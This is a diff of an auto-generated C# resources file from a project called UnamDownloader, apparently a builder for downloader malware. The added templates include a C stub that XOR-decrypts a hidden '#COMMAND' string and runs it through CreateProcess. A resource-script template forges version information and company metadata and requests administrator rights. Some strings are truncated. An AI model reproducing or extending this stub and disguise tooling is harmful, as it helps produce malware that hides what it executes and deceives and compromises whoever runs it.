@@ -71,16 +71,6 @@ namespace UnamDownloader.Properties {
         }
         
         /// <summary>
-        ///   Looks up a localized resource of type System.Byte[].
-        /// </summary>
-        internal static byte[] manifest {
-            get {
-                object obj = ResourceManager.GetObject("manifest", resourceCulture);
-                return ((byte[])(obj));
-            }
-        }
-        
-        /// <summary>
         ///   Looks up a localized resource of type System.Drawing.Bitmap.
         /// </summary>
         internal static System.Drawing.Bitmap microsoft_admin {
@@ -91,60 +81,71 @@ namespace UnamDownloader.Properties {
         }
         
         /// <summary>
-        ///   Looks up a localized string similar to using System;
-        ///using System.IO;
-        ///using System.Text;
-        ///using System.Diagnostics;
-        ///using System.Runtime.InteropServices;
-        ///#if DefDebug
-        ///using System.Windows.Forms;
-        ///#endif
-        ///#if DefAdmin
-        ///using System.Security.Principal;
-        ///#endif
-        ///#if DefAssembly
-        ///using System.Reflection;
-        ///[assembly: AssemblyTitle(&quot;%Title%&quot;)]
-        ///[assembly: AssemblyDescription(&quot;%Description%&quot;)]
-        ///[assembly: AssemblyCompany(&quot;%Company%&quot;)]
-        ///[assembly: AssemblyProduct(&quot;%Product%&quot;)]
-        ///[assembly: AssemblyCopyright(&quot;%Copyright%&quot;)]
-        ///[assembly: AssemblyTrademark(&quot;%Trademark%&quot;) [rest of string was truncated]&quot;;.
+        ///   Looks up a localized resource of type System.Byte[].
         /// </summary>
-        internal static string Program {
+        internal static byte[] MinGW64 {
             get {
-                return ResourceManager.GetString("Program", resourceCulture);
+                object obj = ResourceManager.GetObject("MinGW64", resourceCulture);
+                return ((byte[])(obj));
             }
         }
         
         /// <summary>
         ///   Looks up a localized string similar to #include &lt;windows.h&gt;
+        ///#include &lt;stdlib.h&gt;
         ///
         ////* Created by Unam Sanctam, https://github.com/UnamSanctam */
         ///
-        ///void inplace_rev( char * s ) {
-        ///  char t, *e = s + strlen(s);
-        ///  while ( --e &gt; s ) { t = *s;*s++=*e;*e=t; }
+        ///char* cipher(char* data, char* key, int dataLen) {
+        ///	int keyLen = strlen(key);
+        ///	char* output = (char*)malloc(sizeof(char) * dataLen+1);
+        ///	output[dataLen] = 0;
+        ///	for (int i = 0; i &lt; dataLen; ++i) {
+        ///		output[i] = data[i] ^ key[i % keyLen];
+        ///	}
+        ///	return output;
         ///}
         ///
         ///int main(int argc, char **argv) 
         ///{
-        ///	  PROCESS_INFORMATION p_info;
-        ///	  STARTUPINFO s_info;
+        ///	PROCESS_INFORMATION p_info;
+        ///	STARTUPINFO s_info;
         ///
-        ///	  memset(&amp;s_info, 0, sizeof(s_info));
-        ///	  memset(&amp;p_info, 0, sizeof(p_info));
-        ///	  s_info.cb = sizeof(s_info);
-        ///	  
-        ///	  char commands[] = &quot;#COMMAND&quot;;
-        ///	  
-        ///	  inplace_rev(commands);
-        ///
-        ///	  if (CreateProcess(NULL, commands, NULL, NULL, FA [rest of string was truncated]&quot;;.
+        ///	memset(&amp;s_info, 0, sizeof(s_info));
+        ///	memset(&amp;p_info, 0, sizeof( [rest of string was truncated]&quot;;.
         /// </summary>
         internal static string Program1 {
             get {
                 return ResourceManager.GetString("Program1", resourceCulture);
+            }
+        }
+        
+        /// <summary>
+        ///   Looks up a localized string similar to #ifdef DefIcon
+        ///MAINICON ICON &quot;#ICON&quot;
+        ///#endif
+        ///#ifdef DefAdmin
+        ///1 24 &quot;administrator.manifest&quot;
+        ///#endif
+        ///#ifdef DefAssembly
+        ///1 VERSIONINFO
+        ///FILEVERSION     #VERSION
+        ///PRODUCTVERSION  #VERSION
+        ///BEGIN
+        ///    BLOCK &quot;StringFileInfo&quot;
+        ///    BEGIN
+        ///        BLOCK &quot;040904b0&quot;
+        ///        BEGIN
+        ///            VALUE &quot;CompanyName&quot;, &quot;#COMPANY&quot;
+        ///			VALUE &quot;FileTitle&quot;, &quot;#TITLE&quot;
+        ///            VALUE &quot;FileDescription&quot;, &quot;#DESCRIPTION&quot;
+        ///            VALUE &quot;FileVersion&quot;, &quot;#VERSION&quot;
+        ///            VALUE &quot;LegalCopyright&quot;, &quot;#COPYRIGHT&quot;
+        ///			VALUE &quot; [rest of string was truncated]&quot;;.
+        /// </summary>
+        internal static string resource {
+            get {
+                return ResourceManager.GetString("resource", resourceCulture);
             }
         }
         
